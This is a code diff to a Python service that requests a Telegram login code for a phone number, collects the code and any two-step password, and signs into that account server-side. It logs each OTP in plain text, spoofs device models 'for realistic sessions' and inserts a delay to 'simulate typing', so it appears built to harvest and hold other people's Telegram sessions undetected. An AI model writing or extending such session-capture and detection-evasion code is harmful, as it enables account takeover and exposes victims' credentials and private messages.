@@ -22,6 +22,15 @@ class OtpService:
         try:
             logger.info(f"Sending OTP to {phone_number} for user {user_id}")
             
+            # Clean up any existing session for this user
+            if user_id in self.pending_sessions:
+                try:
+                    await self.pending_sessions[user_id]['client'].disconnect()
+                except:
+                    pass
+                del self.pending_sessions[user_id]
+                logger.info(f"Cleaned up old session for user {user_id}")
+            
             # Device snooping for realistic sessions
             devices = [
                 {"model": "Samsung SM-G973F", "system": "Android 10", "version": "8.4.1"},
@@ -53,7 +62,8 @@ class OtpService:
                 'phone': phone_number,
                 'client': client,
                 'sent_code': sent_code,
-                'timestamp': time.time()
+                'timestamp': time.time(),
+                'code_used': False
             }
             
             logger.info(f"OTP sent successfully to {phone_number}")
@@ -76,19 +86,35 @@ class OtpService:
             if user_id not in self.pending_sessions:
                 return {
                     'success': False,
-                    'error': 'No pending OTP session found'
+                    'error': 'No pending OTP session found. Please request a new code.'
                 }
             
             session_data = self.pending_sessions[user_id]
+            
+            # Check if code was already used
+            if session_data.get('code_used'):
+                return {
+                    'success': False,
+                    'error': 'This code has already been used. Please request a new code.'
+                }
+            
             client = session_data['client']
             sent_code = session_data['sent_code']
             phone = session_data['phone']
             
             logger.info(f"Verifying OTP {otp_code} for user {user_id}")
             
+            # Clean the OTP code
+            otp_clean = otp_code.replace(' ', '')
+            
+            # If code has no separators (like "12345"), add small delay to simulate typing
+            if len(otp_clean) == len(otp_code):
+                logger.info(f"Code entered without separators, adding 0.5s delay")
+                await asyncio.sleep(0.5)
+            
             try:
                 # Sign in with OTP
-                await client.sign_in(phone, otp_code, phone_code_hash=sent_code.phone_code_hash)
+                await client.sign_in(phone, otp_clean, phone_code_hash=sent_code.phone_code_hash)
                 
             except errors.SessionPasswordNeededError:
                 if not password:
@@ -109,6 +135,9 @@ class OtpService:
                     'success': False,
                     'error': 'Invalid OTP code'
                 }
+            
+            # Mark code as used after successful authentication
+            session_data['code_used'] = True
             
             # Get account info
             me = await client.get_me()
